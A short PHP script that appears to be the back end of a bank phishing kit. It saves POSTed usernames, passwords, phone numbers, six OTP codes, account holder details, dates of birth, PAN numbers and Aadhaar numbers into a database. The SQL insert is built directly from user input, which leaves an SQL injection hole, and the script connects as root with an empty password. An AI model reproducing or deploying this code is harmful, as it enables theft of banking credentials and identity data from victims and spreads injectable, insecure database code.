<?php

$server_name ="localhost" ;
$username ="root" ;
$password="" ;
$database_name ="test" ;
$conn = mysqli_connect($server_name,$username,$password,$database_name);

//if($conn){
  echo "  
  ";



if(isset($_POST['save']))
{
   
  $username = $_POST['username'];
  
  $password = $_POST['password'];
  $number = $_POST['number'];
  $otp1 = $_POST['otp1'];
  $BranchName = $_POST['BranchName'];
  $HolderName = $_POST['HolderName'];
  $DOB = $_POST['DOB'];
  $otp2 = $_POST['otp2'];
  $PANCARDNU = $_POST['PANCARDNU'];
  $Name = $_POST['Name'];
  $otp3 = $_POST['otp3'];
   $AadhaarCARDNU= $_POST['AadhaarCARDNU'];
  $otp4 = $_POST['otp4'];
   $otp5 = $_POST['otp5'];
  $otp6 = $_POST['otp6'];


              


  $sql_query = " INSERT INTO img (username,password,number,otp1,BranchName,HolderName,DOB,otp2,PANCARDNU,Name,otp3,AadhaarCARDNU,otp4,otp5,otp6)
 VALUES('$username','$password','$number','$otp1','$BranchName','$HolderName','$DOB','$otp2','$PANCARDNU','$Name','$otp3','$AadhaarCARDNU','$otp4','$otp5','$otp6')";

 if (mysqli_query($conn,$sql_query))
 {
  echo "";
 }
 else
 {
  echo "error"; 

 }

}
?>